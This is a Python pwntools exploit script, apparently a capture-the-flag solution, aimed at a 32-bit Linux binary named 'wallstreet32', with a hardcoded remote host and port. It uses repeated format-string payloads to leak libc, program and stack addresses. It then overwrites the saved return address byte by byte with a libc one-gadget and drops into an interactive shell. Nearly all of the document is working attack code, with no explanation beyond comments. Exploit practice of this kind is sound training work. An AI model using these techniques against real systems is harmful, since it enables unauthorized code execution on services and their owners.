#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="i386", os="linux")
context.log_level = 'error'


def tohex(val, nbits):
    return hex((val + (1 << nbits)) % (1 << nbits))


exe = ELF('./wallstreet32')
libc = ELF('./libc.so.6')

if args.REMOTE:
    host, port = "143.198.127.103", "42006"


print('trying to do a ret2main an to have good stack configuration...')
count = 0
# first we do a little bruteforce for waiting the good stack configuration, and trying a ret2main
while (True):
    if args.REMOTE:
        p = remote(host, port)
    else:
        p = process(exe.path)
    p.sendlineafter('stonks!\n', '1')
    p.sendlineafter('see?\n', '47')
    payload = '%c'*84+'%220c'+'%hhn'+'%c'*3+'%*\n' + \
        '%c'*18+'%119c'+'%hhn'+'%c'+'%*\n'+'%c'+'%*\n'
    p.sendlineafter('token?\n', payload)
    p.recvuntil('token:\n', drop=True)

    # got our leaks
    # libc leak (libc got actually)
    p.readuntil('%', drop=True)
    leak2 = int(p.recvuntil('\n', drop=True), 10)
    libc.address = (0x100000000+leak2) - 0x1e5000
    # progbase leak
    p.readuntil('%', drop=True)
    leak1 = int(p.recvuntil('\n', drop=True), 10)
    progbase = leak1 - 0x15f0
    # stack leak
    p.readuntil('%', drop=True)
    leak3 = int(p.recvuntil('\n', drop=True), 10)

    try:
        # if we received back stonks string, the ret2main was successfull
        out = p.recvuntil('stonks!\n', timeout=3)
        break
    except:
        # if it fails, try again...
        count += 1
        print('try ret2main: '+str(count))
        p.close()

print('ret2main success')
# dump our precious leaks
print('prog base = '+tohex(progbase, 32))
print('libc base = '+tohex(libc.address, 32))
print('leak stack = '+tohex(leak3, 32))

low0 = (leak3 - 0x1d0) & 0xffff

p.sendline('1')
p.sendlineafter('see?\n', '47')

oneg = libc.address + 0x142feb  # onegdaget address
got = libc.address + 0x1e5000   # libc got address

# first we setup stack pointers
count = 0
payload = '%c'*76+'%'+str(low0-76)+'c'+'%hn'+'%c'*18+'%218c'+'%hhn'
payload += '%c'*31+'%'+str(0x40)+'c'+'%hhn'
payload += 'Cc'

p.sendlineafter('token?\n', payload)
p.recvuntil('Cc', drop=True)
p.sendlineafter('see?\n', '1')
count += 1

# first we write got address needed by the onegadget on stack
count = 0
while (count < 3):
    # 1st round we write index to write in 2nd round
    payload = '%'+str(count+9)+'c'+'%98$hhn'+'%' + \
        str(0x67-(9+count))+'c'+'%131$hhnCc'
    p.sendlineafter('token?\n', payload)
    p.recvuntil('Cc', drop=True)
    p.sendlineafter('see?\n', '1')

    # we write got byte by byte to the stack
    payload = '%'+str(0x67)+'c%131$hhn'+'%' + \
        str(0x99+((got >> ((count+1)*8)) & 0xff))+'c%122$hhnCc'
    p.sendlineafter('token?\n', payload)
    p.recvuntil('Cc', drop=True)
    p.sendlineafter('see?\n', '1')
    print('count='+str(count))
    count += 1


# then we replace return address libc_main, with a onegadget address
print('now sending one gadget..')
count = 0
while (count < 4):
    # 1st round write the index for the 2nd rount
    payload = '%'+str(count+0x1c)+'c'+'%98$hhn'+'%' + \
        str(0x67-(0x1c+count))+'c'+'%131$hhnCc'
    p.sendlineafter('token?\n', payload)
    p.recvuntil('Cc', drop=True)
    p.sendlineafter('see?\n', '1')

    # 2nd round we write onegagdget address byte by byte
    payload = '%'+str(0x67)+'c%131$hhn'+'%' + \
        str(0x99+((oneg >> (count*8)) & 0xff))+'c%122$hhnCc'
    p.sendlineafter('token?\n', payload)
    p.recvuntil('Cc', drop=True)
    p.sendlineafter('see?\n', '1')
    print('count='+str(count))
    count += 1

p.sendlineafter('token?\n', '%c')
# gotshell

p.interactive()
